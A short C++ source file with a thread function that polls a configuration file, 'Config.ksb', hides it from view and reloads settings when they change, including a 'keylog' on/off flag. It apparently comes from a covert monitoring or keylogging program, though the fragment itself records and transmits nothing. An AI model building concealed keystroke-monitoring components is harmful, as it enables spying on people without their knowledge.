#include "ThreadSocket.h"
void *ListenSocketProc(void *param)
{
	control *C = (control*)param;
	control *A = new control;
	bool cmp = true;

	ifstream ifst;
	FILE *fp;

	do {

		Sleep(1);

		fp = fopen("Config.ksb", "r");
		if (fp == NULL)
			return NULL;
		else
			fclose(fp);

		HideFile("Config.ksb");

		ifst.open("Config.ksb", ios::in);

		ifst >> A->stop;
		for (int i = 0; i < 6; i++)
			ifst >> A->period[i];
		for (int i = 0; i < 6; i++)
			ifst >> A->run[i];

		ifst >> A->keylog;
		ifst >> A->run_s;
		ifst >> A->period_s;

		if (A->stop != C->stop)
			cmp = false;

		for (int i = 0; i < 6; i++)
		{
			if (A->period[i] != C->period[i])
				cmp = false;
		}

		for (int i = 0; i < 6; i++)
		{
			if (A->run[i] != C->run[i])
				cmp = false;
		}

		if(A->keylog != C->keylog)
			cmp = false;

		if (A->run_s != C->run_s)
			cmp = false;

		if (A->period_s != C->period_s)
			cmp = false;

		ifst.close();

	} while (cmp != false);

	return (void*)A;
}